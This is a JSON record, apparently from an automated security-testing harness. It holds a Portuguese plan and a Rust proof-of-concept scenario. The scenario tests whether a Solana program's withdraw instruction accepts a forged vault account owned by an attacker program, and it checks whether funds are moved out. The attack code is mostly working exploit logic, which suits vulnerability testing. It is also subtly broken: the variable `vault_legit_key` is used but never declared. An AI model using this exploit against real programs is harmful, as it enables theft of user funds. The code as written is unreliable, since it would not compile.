{
  "plan": "O cenário monta um vault legítimo com owner = program_id e dados contendo a autoridade e um saldo, e um vault forjado com owner = outro programa (attacker_program) e os mesmos bytes de layout. O baseline executa withdraw com o vault legítimo, provando que o cenário está correto. O ataque executa withdraw com o vault forjado, mantendo a mesma autoridade e saldo, para testar se o programa aceita dados não autenticados. O efeito mede que o saldo do vault forjado foi decrementado e/ou que os lamports foram transferidos, demonstrando que o ataque foi bem-sucedido.",
  "scenario": "let program_id = env.program_id;
let attacker_program = env.attacker_program.unwrap_or(Pubkey::new_unique());

let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();
let amount: u64 = 100;

// Vault legítimo: owner = program_id, dados com autoridade e saldo
let mut vault_data = vec![0u8; 48];
vault_data[8..40].copy_from_slice(authority.as_ref());
vault_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
let vault_legit = account(&program_id, &vault_data, None);

// Vault forjado: owner = attacker_program, mesmos dados
let vault_forged = account(&attacker_program, &vault_data, None);

let recipient_account = wallet(0);

// Instrução withdraw: discriminador 0 + amount (u64 LE)
let mut ix_data = vec![0u8; 9];
ix_data[0] = 0;
ix_data[1..9].copy_from_slice(&amount.to_le_bytes());

let metas = vec![
    AccountMeta::new(vault_legit_key, false),
    AccountMeta::new_readonly(authority, false),
    AccountMeta::new(recipient, false),
];

// Baseline com vault legítimo
let ix_baseline = env.raw_ix(&ix_data, metas.clone());
let contas_baseline = vec![
    (vault_legit_key, vault_legit),
    (authority, account(&program_id, &[], None)), // authority não precisa de dados
    (recipient, recipient_account.clone()),
];
let r_baseline = env.baseline("withdraw legítimo", &ix_baseline, &contas_baseline);

// Ataque: mesmo withdraw, mas vault forjado com owner diferente
let vault_forged_key = Pubkey::new_unique();
let metas_attack = vec![
    AccountMeta::new(vault_forged_key, false),
    AccountMeta::new_readonly(authority, false),
    AccountMeta::new(recipient, false),
];
let ix_attack = env.raw_ix(&ix_data, metas_attack);
let contas_attack = vec![
    (vault_forged_key, vault_forged),
    (authority, account(&program_id, &[], None)),
    (recipient, recipient_account),
];
let r_attack = env.attack("withdraw com vault forjado", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let vault_after = after(&r_attack, &vault_forged_key);
    let recipient_after = after(&r_attack, &recipient);
    // O saldo do vault forjado deve ter sido decrementado
    let saldo_forjado = read_u64(vault_after.data(), 40);
    env.effect("saldo do vault forjado decrementado", saldo_forjado == 1000 - amount);
    // O recipient deve ter recebido lamports
    env.effect("recipient recebeu lamports", recipient_after.lamports() > 0);
}"
}

